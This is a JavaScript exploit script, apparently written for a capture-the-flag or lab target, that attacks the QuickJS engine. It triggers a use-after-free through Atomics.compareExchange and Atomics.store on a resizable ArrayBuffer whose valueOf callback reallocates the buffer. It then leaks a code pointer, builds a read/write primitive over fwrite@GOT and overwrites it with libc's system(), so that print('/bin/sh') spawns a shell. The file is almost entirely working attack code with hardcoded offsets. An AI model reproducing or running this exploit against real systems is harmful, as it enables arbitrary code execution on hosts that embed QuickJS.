// QuickJS Atomics + resizable ArrayBuffer exploit -> exec-shell
// Primitive: overwrite fwrite@GOT with system(), then call print("/bin/sh")

function hex(x) {
  if (typeof x === 'number') x = BigInt(x);
  let s = x.toString(16);
  return '0x' + s;
}

// Offsets (static)
const QJS_OFF_JS_ARRAY_BUFFER_FREE = 0x14bc0n;      // nm -an qjs | grep js_array_buffer_free
const QJS_OFF_GOT_FWRITE = 0x10b380n;              // readelf -r qjs | grep fwrite

const LIBC_OFF_FWRITE = 0x7f2c0n;                  // nm -D libc.so.6 | grep fwrite@@
const LIBC_OFF_SYSTEM = 0x53110n;                  // nm -D libc.so.6 | grep system@@

// Make sure fwrite is resolved (lazy binding)
print('warmup');

function leak_qjs_text_ptr() {
  // Create RAB whose *data* chunk size matches malloc(56) -> glibc chunk 0x50.
  let rab = new ArrayBuffer(56, { maxByteLength: 0x3000 });
  let ta = new BigUint64Array(rab);

  // Heap grooming: allocate a chunk after rab->data so realloc growth moves.
  let blocker = new ArrayBuffer(0x1000);

  let victim;
  // Use compareExchange to get a read of 8 bytes at stale ptr without clobbering.
  let expected = {
    valueOf: function () {
      // Force rab->data realloc(move) and free the old 0x50-sized chunk.
      rab.resize(0x2000);
      // Allocate a new ArrayBuffer so its JSArrayBuffer struct reuses the freed chunk.
      victim = new ArrayBuffer(0x20);
      // expected value = 0 (won't match a function pointer)
      return 0n;
    }
  };

  // idx 6 => offset 0x30 => JSArrayBuffer.free_func
  let leaked = Atomics.compareExchange(ta, 6, expected, 0n);
  // Keep victim alive (avoid immediate free of corrupted struct)
  globalThis._victim1 = victim;
  return leaked;
}

function make_got_rw_buffer(target_addr) {
  // Similar technique, but now we *write* to victim2.abuf->data (offset 0x10).
  let rab = new ArrayBuffer(56, { maxByteLength: 0x3000 });
  let ta = new BigInt64Array(rab);
  let blocker = new ArrayBuffer(0x1000);

  let victim;
  let writer = {
    valueOf: function () {
      rab.resize(0x2000);
      victim = new ArrayBuffer(0x20);
      // Atomics.store() will write this int64 to stale ptr (victim.abuf->data)
      return target_addr;
    }
  };

  // idx 2 => offset 0x10 => JSArrayBuffer.data
  Atomics.store(ta, 2, writer);
  globalThis._victim2 = victim;
  return victim;
}

let js_array_buffer_free_ptr = leak_qjs_text_ptr();
let qjs_base = js_array_buffer_free_ptr - QJS_OFF_JS_ARRAY_BUFFER_FREE;
let fwrite_got = qjs_base + QJS_OFF_GOT_FWRITE;

// Corrupt victim2 so its backing store pointer == fwrite@GOT
let got_buf = make_got_rw_buffer(fwrite_got);
let got64 = new BigUint64Array(got_buf);

let libc_fwrite = got64[0];
let libc_base = libc_fwrite - LIBC_OFF_FWRITE;
let libc_system = libc_base + LIBC_OFF_SYSTEM;

// Overwrite fwrite@GOT -> system
got64[0] = libc_system;

// Trigger: print() calls fwrite(str,1,len,stdout) -> now system(str)
print('/bin/sh');
